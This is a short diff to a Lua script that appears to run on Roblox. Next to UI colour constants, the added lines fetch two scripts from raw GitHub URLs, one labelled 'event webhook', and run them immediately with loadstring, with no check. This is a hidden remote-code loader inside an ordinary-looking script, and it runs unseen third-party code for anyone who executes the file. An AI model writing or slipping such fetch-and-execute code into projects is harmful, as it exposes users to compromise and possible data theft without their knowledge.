@@ -95,6 +95,29 @@ local COLOR_DISABLED = Color3.fromRGB(244, 67, 54) -- Red
 local COLOR_PRIMARY = Color3.fromRGB(103, 58, 183) -- Purple
 local COLOR_SECONDARY = Color3.fromRGB(30, 30, 46)  -- Dark
 
+
+
+local luckFishScript = "https://raw.githubusercontent.com/fpszrxy/sigma/refs/heads/main/luck%20server%20fish%20it"
+local eventWebhookScript = "https://raw.githubusercontent.com/fpszrxy/sigma/refs/heads/main/event%20webhook"
+
+-- Step 3: Example fetch & execution (if using game platforms like Roblox)
+local function loadScriptFromUrl(url)
+    local success, response = pcall(function()
+        return game:HttpGet(url)
+    end)
+
+    if success then
+        local func = loadstring(response)
+        if func then
+            return func()
+        end
+    end
+end
+
+-- Step 4: Execute scripts
+loadScriptFromUrl(luckFishScript)
+loadScriptFromUrl(eventWebhookScript)
+
 -- =============================================================================
 -- NEW FEATURES FROM SECOND SCRIPT
 -- =============================================================================
